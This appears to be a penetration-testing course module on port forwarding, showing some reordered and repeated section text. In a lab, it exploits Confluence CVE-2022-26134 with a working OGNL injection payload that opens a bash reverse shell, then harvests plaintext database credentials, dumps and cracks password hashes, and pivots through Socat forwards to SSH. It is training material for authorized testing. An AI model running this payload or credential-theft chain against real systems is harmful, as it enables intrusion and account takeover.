As part of the network segmentation process, most network administrators will also implement controls that limit the flow of traffic into, out from, and across their networks. To enforce this, they will deploy various technologies throughout the network.

One of the most common technologies used for this is [_Firewalls_](https://en.wikipedia.org/wiki/Firewall_(computing)). Firewalls can be implemented at the endpoint software level. For example, the _Linux kernel_ has firewall capabilities that can be configured with the [_iptables_](https://en.wikipedia.org/wiki/Iptables) tool suite, while Windows offers the built-in [_Windows Defender Firewall_](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-firewall/windows-firewall-with-advanced-security). Firewalls may also be implemented as features within a piece of physical network infrastructure. Administrators may even place a standalone _hardware firewall_ in the network, filtering all traffic.

Firewalls can drop unwanted inbound packets and prevent potentially malicious traffic from traversing or leaving the network. Firewalls may prevent all but a few allowed hosts from communicating with a port on a particularly privileged server. They can also block some hosts or subnets from accessing the wider _internet_.

Most firewalls tend to allow or block traffic in line with a set of rules based on _IP addresses_ and _port numbers_, so their functionality is limited. However, sometimes more fine-grained control is required. [_Deep Packet Inspection_](https://en.wikipedia.org/wiki/Deep_packet_inspection) monitors the contents of incoming and outgoing traffic and terminates it based on a set of rules.

Boundaries that are put in place by network administrators are designed to prevent the _arbitrary movement of data into, out of, and across the network_. But, as an attacker, these are exactly the boundaries we need to traverse. We'll need to develop strategies that can help us work around network restrictions as we find them.

_Port redirection_ (a term we are using to describe various types of [_port forwarding_](https://en.wikipedia.org/wiki/Port_forwarding)) and [_tunneling_](https://en.wikipedia.org/wiki/Tunneling_protocol) are both strategies we can use to traverse these boundaries. Port redirection modifies the data flow by redirecting packets from one socket to another. Tunneling means [_encapsulating_](https://en.wikipedia.org/wiki/Encapsulation_(networking)) one type of data stream within another, for example, transporting _Hypertext Transfer Protocol_ (HTTP) traffic within a _Secure Shell_ (SSH) connection (so from an external perspective, only the SSH traffic will be visible).

In this Module, we will introduce port redirection and tunneling techniques through practical examples. We'll ease in by starting with the lowest complexity techniques, and increase complexity as we move step-by-step towards more hardened network environments. Each new technique will be applied to a new network configuration that is slightly different than the previous. The only tunneling we cover in this Module is SSH tunneling, but we will cover more advanced methods in a later Module.

The [_logical topologies_](https://en.wikipedia.org/wiki/Network_topology) we create when chaining these strategies may initially be difficult to grasp. We will be making traffic move in ways that may not be initially intuitive. We should take the time to fully understand each technique before advancing to the next. By the end of this Module, we'll have all the tools required to manipulate the flow of traffic in any given network with surgical precision.

## 19.2. Port Forwarding with Linux Tools

This Learning Unit covers the following Learning Objectives:

1.  Understand what port forwarding is
2.  Learn when to use port forwarding techniques
3.  Use Socat to set up a port forward in Linux

Port forwarding is the most fundamental technique we will examine in this Module. It's also a technique that's very commonly used in general-purpose networking. When port forwarding, we configure a host to listen on one port and relay all packets received on that port to another destination.

In normal network conditions, a network administrator might create a port forward to allow access to a web server behind a firewall. In that case, they would configure the firewall to listen on a given port on one interface and pass all packets to the web server behind it.

Many home _routers_ also provide port forwarding functionality. These can be configured to listen on a port on the Internet-facing side of the router, then forward connections from that port to another device within the home network.

How might we use port forwarding in an attack chain? In the next section, we'll consider a simple scenario.

## 19.2.1. A Simple Port Forwarding Scenario

Let's examine a port forwarding scenario. During an assessment, we find a Linux web server running a version of [_Confluence_](https://www.atlassian.com/software/confluence) vulnerable to [_CVE-2022-26134_](https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html): a pre-authentication remote code execution issue. We can exploit this vulnerability and gain a reverse shell from the server.

During our enumeration, we find that this server has two _network interfaces_: one attached to the same network our Kali machine is also on (which allowed us to route to it directly), and another on an internal subnet. In the Confluence configuration file, we also find credentials and the IP address and port for a [_PostgreSQL_](https://www.postgresql.org/) database instance on a server in that internal subnet. We want to use these credentials to gain access to the database and enumerate further.

The following diagram illustrates our current understanding of the network layout.

![Figure 1: The network layout from our perspective so far](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/9f1e3efdc5c0256e854e387e50f5a621-PRAT2_1_0_ConfluenceAndDatabaseNetworkSetup.png)

Figure 1: The network layout from our perspective so far

One of the first things to notice about this diagram is that there are two named networks: the [_Wide Area Network_](https://en.wikipedia.org/wiki/Wide_area_network) (WAN) on the left and the [_Demilitarized Zone_](https://en.wikipedia.org/wiki/DMZ_(computing)) (DMZ) on the right. Our Kali machine is in the WAN, the PostgreSQL database server PGDATABASE01 is in the DMZ, and the Confluence server CONFLUENCE01 straddles both.

A WAN is a network that is large and expansive. Some people refer to the public internet as the largest WAN in the world, and some larger organizations will refer to their large internal network as a WAN, or internal WAN. In this case, since we're simulating an attack from an external network, the WAN represents a large corporate internal network, or the internet itself.

In this module’s exercises, our Kali machine will be positioned in the WAN We can route directly from our Kali machine only to hosts also on the WAN.

A DMZ is a network containing devices that may be more exposed to a wider, less trusted network. A DMZ helps create a buffer zone between hosts on the wider, less trusted network and internal hosts. In this way, it serves a similar function to a real-world [_Demilitarized zone_](https://en.wikipedia.org/wiki/Demilitarized_zone). In this scenario, the DMZ is the buffer network segment between the WAN and whatever other internal networks we may find.

CONFLUENCE01 is straddling both the WAN and DMZ to illustrate that it can communicate on both networks. CONFLUENCE01 is also listening on TCP port 8090, illustrated by the "open socket" attached to the icon.

PGDATABASE01 is within the DMZ network boundary; it does not straddle the WAN/DMZ. Our Kali machine is not in the DMZ, so we can't directly route to PGDATABASE01. PGDATABASE01 also has an "open socket" attached to it, illustrating that there's something listening on TCP port 5432 (this is likely a PostgreSQL server, since the default port is 5432).

Since the only thing we know about PGDATABASE01 so far is that it exists, we don't yet know if it's attached to any other networks. If later we find that PGDATABASE01 is attached to other networks, we will expand our network diagram.

With the credentials we found on CONFLUENCE01, we want to try to connect to this PostgreSQL port on PGDATABASE01 from our Kali machine.

Before getting into more detail, let's set up our lab environment to recreate the scenario we've described so far.

At the end of the _Port Forwarding with Socat_ section of this Learning Unit, a group of VMs are provided that can be used to follow along with the following sections. These VMs are provided so you can gain hands-on experience with all the techniques we cover. You can start the VM group at any point and follow along at whatever pace feels comfortable.

## 19.2.2. Setting Up the Lab Environment

To gain access to CONFLUENCE01, we need to leverage the command execution vulnerability in the Confluence web application to get a reverse shell. After discovering that the Confluence web application is vulnerable to CVE-2022-26134, we'll find a blog post from [_Rapid7_](https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/) that includes a [_cURL_](https://curl.se/) command containing a [_proof-of-concept_](https://en.wikipedia.org/wiki/Proof_of_concept) payload that claims to exploit the vulnerability and return a reverse shell.

```
curl -v http://10.0.0.28:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/10.0.0.28/1270%200%3E%261%27%29.start%28%29%22%29%7D/
```

> Listing 1 - The example payload from the Rapid7 blog post.

We don't run payloads without understanding exactly what they do, so we first need to figure out what's happening in this proof-of-concept.

The verbose (**\-v**) **curl** request is being made to **http://10.0.0.28:8090**, which we assume is the blogpost author's vulnerable Confluence server. After this, the URL [_path_](https://en.wikipedia.org/wiki/Uniform_Resource_Identifier#Syntax) looks more interesting. We observe that a lot of the characters in it are [_URL encoded_](https://en.wikipedia.org/wiki/Percent-encoding), so we need to _URL decode_ them to get a clearer sense of what the payload actually does.

You can quickly URL decode strings by selecting _Decode As..._ > _URL_ in the _Decoder_ tab in [_Burp_](https://portswigger.net/burp), or using an online tool such as [_CyberChef_](https://gchq.github.io/CyberChef/) If working with sensitive information in a real corporate environment, you should avoid pasting data into online tools. However, in this case we're decoding a proof-of-concept that's already public, so we can use online tools if necessary.

After URL decoding the path, the function of the payload is clearer.

```
/${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command('bash','-c','bash -i >& /dev/tcp/10.0.0.28/1270 0>&1').start()")}/
```

> Listing 2 - The example payload URL-decoded.

The URL path is an _OGNL injection_ payload. OGNL is [_Object-Graph Notation Language_](https://en.wikipedia.org/wiki/OGNL), an expression language commonly used in Java applications. OGNL injection can take place when an application handles user input in such a way that it gets passed to the OGNL expression parser. Since it's possible to execute Java code within OGNL expressions, OGNL injection can be used to execute arbitrary code.

The OGNL injection payload itself uses Java's [_ProcessBuilder_](https://docs.oracle.com/javase/7/docs/api/java/lang/ProcessBuilder.html) class to spawn a _Bash_ interactive reverse shell (_bash -i_).

This proof-of-concept payload is almost perfect for our needs. However, we need to modify it before we can use it. This is for two reasons. First, the Confluence server that the payload is pointing to in the original payload is not where our vulnerable Confluence server is. Second, the Bash reverse shell payload is pointing at port 1270 on 10.0.0.28, which is not where our Kali machine is. We need to modify these parameters in the payload before we can reuse it to exploit CONFLUENCE01 and return a shell to our own Kali machine.

While making these modifications, we also need to take the URL encoding into account. The payload string in the proof-of-concept isn't completely URL encoded. Certain characters (notably ".", "-" and "/") are not encoded. Although it's not always the case, for _this_ exploit, this turns out to be important to the functioning of the payload. If any of these characters are encoded, the server will parse the URL differently, and the payload may not execute. This means we can't apply URL encoding across the whole payload once we've modified it.

Keeping this in mind, we'll manually modify the parameters we need, using the original proof-of-concept payload as our base. We can change the Confluence server IP to **192.168.50.63**, and the Bash interactive shell payload IP and port to a listener we're going to open on our Kali machine (**/dev/tcp/192.168.118.4/4444**). We'll also remove the **curl** verbosity flag. This leaves us with the following modified payload:

```
curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/
```

> Listing 3 - The modified payload.

Now that our payload is customized for our use, we can start a [_Netcat_](https://en.wikipedia.org/wiki/Netcat) listener on our Kali machine on TCP port 4444.

```
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
```

> Listing 4 - Starting Netcat listener on port 4444 on our Kali machine.

With our listener running, we'll open another shell on our Kali machine, then run the **curl** command we just constructed.

```
kali@kali:~$ curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/

kali@kali:~$ 
```

> Listing 5 - Executing the modified reverse shell payload.

The command itself doesn't return anything, but the reverse shell is caught by our listener.

```
...
listening on [any] 4444 ...
connect to [192.168.118.4] from (UNKNOWN) [192.168.50.63] 55876
bash: cannot set terminal process group (813): Inappropriate ioctl for device
bash: no job control in this shell
confluence@confluence01:/opt/atlassian/confluence/bin$ id
id
uid=1001(confluence) gid=1001(confluence) groups=1001(confluence)
```

> Listing 6 - Bash reverse shell caught by our Netcat listener, and confirmed with the id command.

The **id** command confirms that this shell is running with the privileges of the _confluence_ user. This user has quite limited privileges. Regardless, we now have a reverse shell from CONFLUENCE01 to our Kali machine.

We can now start some light enumeration of CONFLUENCE01 using our new shell. We'll check the network interfaces using **ip addr**.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ ip addr
ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:8a:54:46 brd ff:ff:ff:ff:ff:ff
    inet 192.168.50.63/24 brd 192.168.50.255 scope global ens192
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:5446/64 scope link 
       valid_lft forever preferred_lft forever
3: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:8a:c2:c9 brd ff:ff:ff:ff:ff:ff
    inet 10.4.50.63/24 brd 10.4.50.255 scope global ens224
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:c2c9/64 scope link 
       valid_lft forever preferred_lft forever
```

> Listing 7 - Enumerating network interfaces on CONFLUENCE01.

The output shows us that CONFLUENCE01 has two network interfaces: _ens192_ and _ens224_. _ens192_ has the IP address 192.168.50.63, and _ens224_ has the IP address 10.4.50.63. We can then check the routes using **ip route**.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ ip route
ip route
default via 192.168.50.254 dev ens192 proto static 
10.4.50.0/24 dev ens224 proto kernel scope link src 10.4.50.63 
10.4.50.0/24 via 10.4.50.254 dev ens224 proto static
192.168.50.0/24 dev ens192 proto kernel scope link src 192.168.50.63
```

> Listing 8 - Enumerating routes on CONFLUENCE01.

The command shows us that we should be able to access hosts in the 192.168.50.0/24 subnet through the _ens192_ interface, and hosts in the 10.4.50.0/24 subnet through the _ens224_ interface.

Continuing our enumeration, we'll find the Confluence configuration file at **/var/atlassian/application-data/confluence/confluence.cfg.xml**. While reading the contents using **cat**, we discover some plaintext database credentials located within.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ cat /var/atlassian/application-data/confluence/confluence.cfg.xml
<sian/application-data/confluence/confluence.cfg.xml   
<?xml version="1.0" encoding="UTF-8"?>

<confluence-configuration>
  <setupStep>complete</setupStep>
  <setupType>custom</setupType>
  <buildNumber>8703</buildNumber>
  <properties>
...
    <property name="hibernate.connection.password">D@t4basePassw0rd!</property>
    <property name="hibernate.connection.url">jdbc:postgresql://10.4.50.215:5432/confluence</property>
    <property name="hibernate.connection.username">postgres</property>
...
  </properties>
</confluence-configuration>
confluence@confluence01:/opt/atlassian/confluence/bin$ 
```

> Listing 9 - The credentials found in the Confluence confluence.cfg.xml file on CONFLUENCE01.

We'll find the IP address of the database server, as well as the plain text username and password used to connect to it. We can use these credentials to authenticate to the database and continue our enumeration.

We've hit a limitation, however. CONFLUENCE01 doesn't have a PostgreSQL client installed on it. Since we are running as the low-privileged _confluence_ user, we are also unable to easily install software.

We _do_ have the PostgreSQL client _psql_ installed on our Kali machine, but we can't connect directly to PGDATABASE01 from our Kali machine, since it's only routable from CONFLUENCE01.

In this scenario, there is no firewall in place between our Kali machine and CONFLUENCE01, meaning that there is nothing stopping us from binding ports on the WAN interface of CONFLUENCE01 and connecting to them from our Kali machine.

This is exactly the type of situation in which port forwarding can be useful. We can create a port forward on CONFLUENCE01 that listens on a port on the WAN interface, then forward all packets received on this port to the PGDATABASE01 on the internal subnet. In the next section, we will use [_Socat_](http://www.dest-unreach.org/socat/doc/socat.html) to achieve this.

## 19.2.3. Port Forwarding with Socat

Now we are ready to create a port forward. We have an idea of how we want it to work: CONFLUENCE01 should listen on a port on the WAN interface and forward all packets received on this port to the PGDATABASE01 on the internal subnet. This concept is illustrated in the following diagram:

![Figure 2: The way we expect our port forward to work](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/0821666b2826564e07661eba0550c37a-PRAT2_1_1_PortForwardPlan.png)

Figure 2: The way we expect our port forward to work

We want to open TCP port 2345 on the WAN interface of CONFLUENCE01, then connect to that port from our Kali machine. We want all the packets that we send to this port to be forwarded by CONFLUENCE01 to TCP port 5432 on PGDATABASE01. Once we set up our port forward, connecting to TCP port 2345 on CONFLUENCE01 will be exactly like connecting directly to TCP port 5432 on PGDATABASE01.

As part of our enumeration of CONFLUENCE01, we'll find Socat installed. Socat is a general-purpose networking tool that can set up a simple port forward in a single command.

In this scenario, we find it already installed, but Socat does not tend to be installed by default on \*NIX systems. If not already installed, it's possible to download and run a statically linked binary version instead.

We will use Socat to configure the desired port forward on CONFLUENCE01. It will listen on a port on the WAN interface (that our Kali machine can connect to) and forward packets received on that port to PGDATABASE01.

On CONFLUENCE01, we'll start a verbose (**\-ddd**) Socat process. It will listen on TCP port 2345 (**TCP-LISTEN:2345**), fork into a new subprocess when it receives a connection (**fork**) instead of dying after a single connection, then forward all traffic it receives to TCP port 5432 on PGDATABASE01 (**TCP:10.4.50.215:5432**).

We'll listen on port 2345 since it is outside the privileged port range (0-1024), meaning elevated privileges are not required.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
<ocat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432   
2022/08/18 10:12:01 socat[46589] I socat by Gerhard Rieger and contributors - see www.dest-unreach.org
2022/08/18 10:12:01 socat[46589] I This product includes software developed by the OpenSSL Project for use in the OpenSSL Toolkit. (http://www.openssl.org/)
2022/08/18 10:12:01 socat[46589] I This product includes software written by Tim Hudson (tjh@cryptsoft.com)
2022/08/18 10:12:01 socat[46589] I setting option "fork" to 1
2022/08/18 10:12:01 socat[46589] I socket(2, 1, 6) -> 5
2022/08/18 10:12:01 socat[46589] I starting accept loop
2022/08/18 10:12:01 socat[46589] N listening on AF=2 0.0.0.0:2345
```

> Listing 10 - Running the Socat port forward command.

The network is now set up like the following diagram:

![Figure 3: Socat in place as our port forwarder](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/eb1577c7ae460992abbeee4839ffb4e3-PRAT2_1_3_PortForwardSocat.png)

Figure 3: Socat in place as our port forwarder

With the Socat process running, we can run **psql** on our Kali machine, specifying that we want to connect to CONFLUENCE01 (**\-h 192.168.50.63**) on port 2345 (**\-p 2345**) with the _postgres_ user account (**\-U postgres**). When prompted, we will enter the password, and once connected, we can run the **\\l** command to list the available databases.

```
kali@kali:~$ psql -h 192.168.50.63 -p 2345 -U postgres
Password for user postgres: 
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

postgres=# \l
                                  List of databases
    Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
------------+----------+----------+-------------+-------------+-----------------------
 confluence | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 postgres   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 template0  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
 template1  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
(4 rows)
```

> Listing 11 - Connecting to the PGDATABASE01 PostgreSQL service and listing databases using psql, through our port forward.

Success! We've connected to the PostgreSQL database through our port forward. We'll also find that we have access to the _confluence_ database.

Using our new database access, we can continue our enumeration. In the confluence database, let's query the _cwd\_user_ table. This contains the username and password hashes for all Confluence users. We'll connect to the database with the **\\c confluence** command, then run **select \* from cwd\_user;** to review everything in that table.

```
postgres=# \c confluence
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
You are now connected to database "confluence" as user "postgres".

confluence=# select * from cwd_user;

   id    |   user_name    | lower_user_name | active |      created_date       |      updated_date       | first_name | lower_first_name |   last_name   | lower_last_name |      display_name      |   lower_display_name   |           email_address            |        lower_email_address         |             external_id              | directory_id |                                credential                                 
---------+----------------+-----------------+--------+-------------------------+-------------------------+------------+------------------+---------------+-----------------+------------------------+------------------------+------------------------------------+------------------------------------+--------------------------------------+--------------+---------------------------------------------------------------------------
  458753 | admin          | admin           | T      | 2022-08-17 15:51:40.803 | 2022-08-17 15:51:40.803 | Alice      | alice            | Admin         | admin           | Alice Admin            | alice admin            | alice@industries.internal          | alice@industries.internal          | c2ec8ebf-46d9-4f5f-aae6-5af7efadb71c |       327681 | {PKCS5S2}WbziI52BKm4DGqhD1/mCYXPl06IAwV7MG7UdZrzUqDG8ZSu15/wyt3XcVSOBo6bC
 1212418 | trouble        | trouble         | T      | 2022-08-18 10:31:48.422 | 2022-08-18 10:31:48.422 |            |                  | Trouble       | trouble         | Trouble                | trouble                | trouble@industries.internal        | trouble@industries.internal        | 164eb9b5-b6ef-4c0f-be76-95d19987d36f |       327681 | {PKCS5S2}A+U22DLqNsq28a34BzbiNxzEvqJ+vBFdiouyQg/KXkjK0Yd9jdfFavbhcfZG1rHE
 1212419 | happiness      | happiness       | T      | 2022-08-18 10:33:49.058 | 2022-08-18 10:33:49.058 |            |                  | Happiness     | happiness       | Happiness              | happiness              | happiness@industries.internal      | happiness@industries.internal      | b842163d-6ff5-4858-bf54-92a8f5b28251 |       327681 | {PKCS5S2}R7/ABMLgNl/FZr7vvUlCPfeCup9dpg5rplddR6NJq8cZ8Nqq+YAQaHEauk/HTP49
 1212417 | database_admin | database_admin  | T      | 2022-08-18 10:24:34.429 | 2022-08-18 10:24:34.429 | Database   | database         | Admin Account | admin account   | Database Admin Account | database admin account | database_admin@industries.internal | database_admin@industries.internal | 34901af8-b2af-4c98-ad1d-f1e7ed1e52de |       327681 | {PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0
 1212420 | hr_admin       | hr_admin        | T      | 2022-08-18 18:39:04.59  | 2022-08-18 18:39:04.59  | HR         | hr               | Admin         | admin           | HR Admin               | hr admin               | hr_admin@industries.internal       | hr_admin@industries.internal       | 2f3cc06a-7b08-467e-9891-aaaaeffe56ea |       327681 | {PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV
 1441793 | rdp_admin      | rdp_admin       | T      | 2022-08-20 20:46:03.325 | 2022-08-20 20:46:03.325 | RDP        | rdp              | Admin         | admin           | RDP Admin              | rdp admin              | rdp_admin@industries.internal      | rdp_admin@industries.internal      | e9a9e0f5-42a2-433a-91c1-73c5f4cc42e3 |       327681 | {PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34
(6 rows)

(END)
```

> Listing 12 - The contents of the cwd\_user table in the confluence database.

We obtain multiple rows of user data. Each row contains data for a single Confluence user, including their password hash. We will use [_Hashcat_](https://hashcat.net/hashcat/) to try to crack these.

The [Hashcat mode number](https://hashcat.net/wiki/doku.php?id=example_hashes) for _Atlassian (PBKDF2-HMAC-SHA1)_ hashes is _12001_, so we can pass that to the **\-m** mode flag. After copying the hashes into a file called **hashes.txt**, we'll pass this as the first positional argument. We can then pass the **fastrack.txt** password list that's built into Kali as the final positional argument.

```
kali@kali:~$ hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt 
hashcat (v6.2.5) starting

OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=====================================================================================================================================
* Device #1: pthread-11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz, 2917/5899 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

...

{PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34:P@ssw0rd!
{PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0:sqlpass123
{PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV:Welcome1234
...
```

> Listing 13 - Hashcat having cracked the database\_admin, hr\_admin and rdp\_admin account hashes.

It appears that the password policy for this Confluence instance isn't very strong. After only a few minutes of cracking, Hashcat returns passwords for the _database\_admin_, _hr\_admin_ and _rdp\_admin_ users.

We might suspect that these passwords are reused in other places throughout the network. After some more enumeration of the internal network, we'll find PGDATABASE01 is also running an SSH server. Let's try these credentials against this SSH server. With our new port forwarding skill, we can create a port forward on CONFLUENCE01 that will allow us to SSH directly from our Kali machine to PGDATABASE01.

First, we need to kill the original Socat process listening on TCP port 2345. We'll then create a new port forward with Socat that will listen on TCP port 2222 and forward to TCP port 22 on PGDATABASE01.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
</bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22 

```

> Listing 14 - Creating a new port forward with Socat to access the SSH service on PGDATABASE01.

With our new Socat port forward set up, our network setup will be configured much like the following diagram:

![Figure 4: Using Socat to open a port forward from CONFLUENCE01 to the SSH server on PGDATABASE01](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/ae6bb27852f848e8c26cbb2eb12443fb-PRAT2_1_4_PortForwardSocatSSH.png)

Figure 4: Using Socat to open a port forward from CONFLUENCE01 to the SSH server on PGDATABASE01

There are only very minimal differences between this and the previous network setup. Instead of listening on 2345, we are listening on 2222. Instead of forwarding to TCP port 5432 on PGDATABASE01, we are forwarding to TCP port 22 on PGDATABASE01.

We'll then use our SSH client to connect to port 2222 on CONFLUENCE01, as though we are connecting directly to port 22 on PGDATABASE01. We can use the _database\_admin_ user, and the password we just cracked using Hashcat.

```
kali@kali:~$ ssh database_admin@192.168.50.63 -p2222
The authenticity of host '[192.168.50.63]:2222 ([192.168.50.63]:2222)' can't be established.
ED25519 key fingerprint is SHA256:3TRC1ZwtlQexLTS04hV3ZMbFn30lYFuQVQHjUqlYzJo.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.50.63]:2222' (ED25519) to the list of known hosts.
database_admin@192.168.50.63's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-122-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 18 Aug 2022 11:43:07 AM UTC

  System load:  0.1               Processes:               241
  Usage of /:   59.3% of 7.77GB   Users logged in:         1
  Memory usage: 16%               IPv4 address for ens192: 10.4.50.215
  Swap usage:   0%                IPv4 address for ens224: 172.16.50.215


0 updates can be applied immediately.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

database_admin@pgdatabase01:~$
```

> Listing 15 - Connecting to SSH server on PGDATABASE01, through the port forward on CONFLUENCE01.

Success! The **database\_admin** credentials have been reused here. We have managed to connect to the SSH server on PGDATABASE01 using the credentials for _database\_admin_ we found in the PostgreSQL database through the port forward we set up on CONFLUENCE01 with Socat.

In this Learning Unit, we created some simple port forwards using Socat. These allowed us to gain deeper access within a network by leveraging our existing access to a compromised host.

It should also be noted that Socat is not the only way to create port forwards on \*NIX hosts. There are several alternatives, of note:

-   [_rinetd_](https://github.com/samhocevar/rinetd) is an option that runs as a daemon. This makes it a better solution for longer-term port forwarding configurations but is slightly unwieldy for temporary port forwarding solutions.
    
-   We can combine Netcat and a [_FIFO_](https://man7.org/linux/man-pages/man7/fifo.7.html) named pipe file to create a [port forward](https://gist.github.com/holly/6d52dd9addd3e58b2fd5).
    
-   If we have root privileges, we could use iptables to create port forwards. The specific iptables port forwarding setup for a given host will likely depend on the configuration already in place. To be able to forward packets in Linux also requires enabling forwarding on the interface we want to forward on by writing "1" to **/proc/sys/net/ipv4/conf/\[interface\]/forwarding** (if it's not already configured to allow it).
    

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

Port Redirection and SSH Tunneling - Port Forwarding with Socat - VM Group

#### Labs

1.  Follow the steps in this section to set up a port forward and gain access to the _confluence_ database on PGDATABASE01 using **psql** from your Kali machine. Crack the password of the _database\_admin_ user. What is the plain text password of this account?

Answer

# 19\. Port Redirection and SSH Tunneling

In this Learning Module, we will cover the following Learning Units:

-   Port Forwarding on \*NIX and Windows Machines
-   SSH Tunneling on (and between) \*NIX and Windows Machines

## 19.1. Why Port Redirection and Tunneling?

This Learning Unit covers the following Learning Objectives:

-   Understand the difference between common network layouts
-   Consider the impact of common network security devices
-   Understand when to use port redirection and tunneling techniques

Most network environments are not -and should not be- [_flat_](https://en.wikipedia.org/wiki/Flat_network), In a flat network, all devices are able to communicate freely with each other. There is little (or no) attempt to limit the access that each device has to other devices on the same network, regardless of whether devices need to communicate during normal operations.

Flat network topology is generally considered poor security practice. Once an attacker has access to a single host, they can start communicating with every other host. From there, it will be much easier to spread through the network and start compromising other hosts.

A more securely designed network type is [_segmented_](https://en.wikipedia.org/wiki/Network_segmentation).This type of network will be broken into smaller networks, each of which is called a [_subnet_](https://en.wikipedia.org/wiki/Subnetwork). Each subnet will contain a group of devices that have a specific purpose, and devices on that subnet are only granted access to other subnets and hosts when absolutely necessary. Network segmentation severely limits attackers, because compromising a single host no longer gives them free access to every other device on the network.

As part of the network segmentation process, most network administrators will also implement controls that limit the flow of traffic into, out from, and across their networks. To enforce this, they will deploy various technologies throughout the network.

